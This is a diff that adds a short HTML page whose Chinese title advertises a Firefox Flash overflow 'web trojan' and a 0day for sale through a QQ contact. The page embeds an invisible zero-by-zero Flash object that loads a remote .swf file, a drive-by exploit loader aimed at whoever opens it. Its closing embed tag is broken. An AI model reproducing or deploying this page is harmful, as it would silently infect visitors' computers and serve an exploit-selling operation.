@@ -1,0 +1,6 @@
+<title>火狐FLASH溢出网马,VIP高中率0DAY联系QQ:579859</title><object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=4,0,19,0" width="0" height="0" align="middle">
+<param name="allowScriptAccess" value="sameDomain">
+<param name="movie" value="http://www.testinghua.com/huohu5798592.swf">http://www.testinghua.com/huohu5798592.swf<param name="quality" value="high">
+<param name="bgcolor" value="#ffffff">
+<embed src=">
+</object>
